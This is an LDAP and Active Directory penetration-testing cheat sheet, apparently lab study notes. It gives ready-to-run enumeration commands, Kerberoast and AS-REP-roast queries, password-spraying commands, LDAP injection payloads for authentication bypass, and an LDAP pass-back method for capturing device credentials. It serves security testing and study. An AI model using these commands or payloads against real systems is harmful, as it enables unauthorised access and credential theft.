#LDAP #LightweightDirectoryAccessProtocol #ActiveDirectory #networkenumeration

## What is LDAP?
Lightweight Directory Access Protocol — standard protocol for accessing and maintaining distributed directory information services. Primary query protocol for Active Directory. Also used by OpenLDAP on Linux/Unix.

- Port: **TCP/UDP 389** — LDAP (plaintext / STARTTLS)
- Port: **TCP 636** — LDAPS (LDAP over SSL/TLS)
- Port: **TCP 3268** — Global Catalog (AD, unencrypted)
- Port: **TCP 3269** — Global Catalog over SSL

---

## Key Concepts

| Term | Description |
|---|---|
| DC | Domain Component — `DC=domain,DC=com` |
| OU | Organizational Unit — container for objects |
| CN | Common Name — object identifier |
| DN | Distinguished Name — full object path |
| Base DN | Root of search — e.g. `DC=inlanefreight,DC=local` |
| Bind | Authentication step before querying |
| Anonymous/Null Bind | Query without credentials |

---

## Enumeration

```bash
# Nmap
nmap -p 389,636,3268,3269 --script ldap-rootdse,ldap-search -sV <target>

# Get base DN / root DSE (no auth)
ldapsearch -H ldap://<target> -x -b "" -s base "objectClass=*"
ldapsearch -H ldap://<target> -x -b "" -s base namingContexts

# Anonymous bind test
ldapsearch -H ldap://<target> -x -b "DC=<domain>,DC=<tld>" "(objectClass=*)" 2>&1 | head -20

# Metasploit
use auxiliary/gather/ldap_query
use auxiliary/scanner/ldap/ldap_login
```

---

## Connect / Access

```bash
# ldapsearch — anonymous bind
ldapsearch -H ldap://<target> -x -b "DC=domain,DC=com" "(objectClass=*)"

# ldapsearch — authenticated bind
ldapsearch -H ldap://<target> -x -D "CN=user,DC=domain,DC=com" -w '<password>' -b "DC=domain,DC=com" "(objectClass=*)"

# ldapsearch — authenticated with domain shorthand
ldapsearch -H ldap://<target> -x -D "<user>@<domain>" -w '<password>' -b "DC=domain,DC=com" "(objectClass=*)"

# LDAPS (SSL)
ldapsearch -H ldaps://<target>:636 -x -D "<user>@<domain>" -w '<password>' -b "DC=domain,DC=com" "(objectClass=*)"
```

---

## Key ldapsearch Queries

```bash
# All objects
ldapsearch -H ldap://<target> -x -b "DC=domain,DC=com" "(objectClass=*)"

# All users
ldapsearch -H ldap://<target> -x -b "DC=domain,DC=com" "(objectClass=user)"

# All users — specific attributes
ldapsearch -H ldap://<target> -x -b "DC=domain,DC=com" "(objectClass=user)" sAMAccountName cn mail description

# All computers
ldapsearch -H ldap://<target> -x -b "DC=domain,DC=com" "(objectClass=computer)" name dNSHostName operatingSystem

# All groups
ldapsearch -H ldap://<target> -x -b "DC=domain,DC=com" "(objectClass=group)"

# Find specific user
ldapsearch -H ldap://<target> -x -b "DC=domain,DC=com" "(sAMAccountName=jdoe)"

# Find admin users
ldapsearch -H ldap://<target> -x -b "DC=domain,DC=com" "(adminCount=1)" sAMAccountName

# Users with no pre-auth (AS-REP roastable)
ldapsearch -H ldap://<target> -x -b "DC=domain,DC=com" \
  "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName

# Users with SPN set (Kerberoastable)
ldapsearch -H ldap://<target> -x -b "DC=domain,DC=com" \
  "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName

# Password in description field
ldapsearch -H ldap://<target> -x -b "DC=domain,DC=com" "(objectClass=user)" description | grep -i "pass\|cred\|secret"

# Find OUs
ldapsearch -H ldap://<target> -x -b "DC=domain,DC=com" "(objectClass=organizationalUnit)"

# Domain password policy
ldapsearch -H ldap://<target> -x -b "DC=domain,DC=com" "(objectClass=domain)" minPwdLength maxPwdAge lockoutThreshold
```

---

## Tools

### windapSearch (preferred for AD)

```bash
# Install
git clone https://github.com/ropnop/windapsearch.git
cd windapsearch && pip install -r requirements.txt

# Enumerate users
python3 windapsearch.py -d <domain> --dc-ip <target> -u "" --users

# Enumerate computers
python3 windapsearch.py -d <domain> --dc-ip <target> -u "" --computers

# Enumerate groups
python3 windapsearch.py -d <domain> --dc-ip <target> -u "" --groups

# Find privileged users (adminCount=1)
python3 windapsearch.py -d <domain> --dc-ip <target> -u "" --privileged-users

# Authenticated queries
python3 windapsearch.py -d <domain> --dc-ip <target> -u <user>@<domain> -p '<pass>' --users
```

### ldapdomaindump

```bash
# Dump all AD info to HTML/JSON/grep-able files
ldapdomaindump <target> -u '<domain>\<user>' -p '<pass>' -o /tmp/ldap_dump

# Anonymous
ldapdomaindump <target> -o /tmp/ldap_dump

# Output files: domain_users.html, domain_computers.html, domain_groups.html, etc.
```

### BloodHound Collection via LDAP

```bash
# SharpHound (Windows — run on domain-joined machine)
.\SharpHound.exe -c All --zipfilename bh_output.zip

# bloodhound-python (Linux — remote)
bloodhound-python -u <user> -p '<pass>' -d <domain> -ns <dc_ip> -c All
bloodhound-python -u <user> -p '<pass>' -d <domain> -ns <dc_ip> -c All --zip
```

---

## Attack Vectors

### Anonymous / Null Bind

```bash
# Test null bind
ldapsearch -H ldap://<target> -x -b "DC=domain,DC=com" "(objectClass=*)" 2>&1 | grep -v "^#\|^$" | head -40

# If successful — enumerate without credentials
ldapsearch -H ldap://<target> -x -b "DC=domain,DC=com" "(objectClass=user)" sAMAccountName
```

### Password Spray via LDAP Bind

```bash
# ldap-brute nmap
nmap -p 389 --script ldap-brute --script-args ldap.base="DC=domain,DC=com" <target>

# Manual bind test
ldapsearch -H ldap://<target> -x -D "user@domain.com" -w 'Password123' -b "DC=domain,DC=com" "(objectClass=*)" 2>&1 | grep -v "^#\|^$"
```

### LDAP Injection (Web Apps)

```
# Authentication bypass payloads
Username: *)(uid=*))(|(uid=*
Password: anything

# Extract data via boolean blind
Username: admin)(|(password=a*
Username: admin)(|(password=b*
```

### LDAP Pass-Back (Printers/Appliances)

```bash
# Target: network device using LDAP for auth (printer, Confluence, etc.)
# Modify LDAP server address in device config to attacker IP
# Start OpenLDAP or listen with tcpdump to capture cleartext bind credentials

# Listen for LDAP bind
sudo tcpdump -i tun0 port 389 -A -w ldap_capture.pcap

# Or use a rogue LDAP server
python3 -m ldap3 # various tools available
```

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| Anonymous/null bind allowed | Unauthenticated AD enumeration |
| LDAP not signed/sealed | LDAP relay attacks |
| Credentials in LDAP attributes (description) | Cleartext password exposure |
| No LDAP referral restrictions | Data leakage to other DCs |
| Weak service account passwords | LDAP auth brute force |

---

## Quick Reference

| Goal | Command |
|---|---|
| Get base DN | `ldapsearch -H ldap://host -x -b "" -s base namingContexts` |
| Null bind enum | `ldapsearch -H ldap://host -x -b "DC=domain,DC=com" "(objectClass=*)"` |
| Enum users (auth) | `ldapsearch -H ldap://host -x -D "user@domain" -w pass -b "DC=..." "(objectClass=user)" sAMAccountName` |
| windapSearch users | `python3 windapsearch.py -d domain --dc-ip host -u "" --users` |
| ldapdomaindump | `ldapdomaindump host -u 'domain\user' -p pass -o /tmp/out` |
| BloodHound (Linux) | `bloodhound-python -u user -p pass -d domain -ns dcip -c All` |
| Kerberoastable | `ldapsearch ... "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName` |
| AS-REP roastable | `ldapsearch ... "(&(objectClass=user)(userAccountControl:...:=4194304))"` |
